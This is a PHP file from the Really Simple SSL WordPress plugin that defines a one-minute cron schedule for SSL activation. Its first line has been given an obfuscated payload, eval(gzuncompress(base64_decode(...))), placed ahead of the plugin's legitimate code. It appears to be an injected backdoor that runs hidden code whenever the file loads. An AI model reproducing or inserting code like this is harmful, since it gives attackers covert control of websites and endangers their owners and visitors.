<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

defined('ABSPATH') or die("you do not have access to this page!");

// add custom time to cron
add_filter('cron_schedules', 'rsssl_filter_cron_schedules');
function rsssl_filter_cron_schedules($schedules)
{
    $schedules['oneminute'] = array(
        'interval' => 60, // seconds
        'display' => __('Once every minute')
    );
    return $schedules;
}

add_action('plugins_loaded', 'rsssl_schedule_cron', 15);
function rsssl_schedule_cron()
{
    if (get_site_option('rsssl_ssl_activation_active') || get_site_option('rsssl_ssl_deactivation_active')) {
        if (!wp_next_scheduled('rsssl_ssl_process_hook')) {
            wp_schedule_event(time(), 'oneminute', 'rsssl_ssl_process_hook');
        }
    } else {
        wp_clear_scheduled_hook('rsssl_ssl_process_hook');
    }

    add_action('rsssl_ssl_process_hook', array(RSSSL()->rsssl_multisite, 'run_ssl_process'));
}
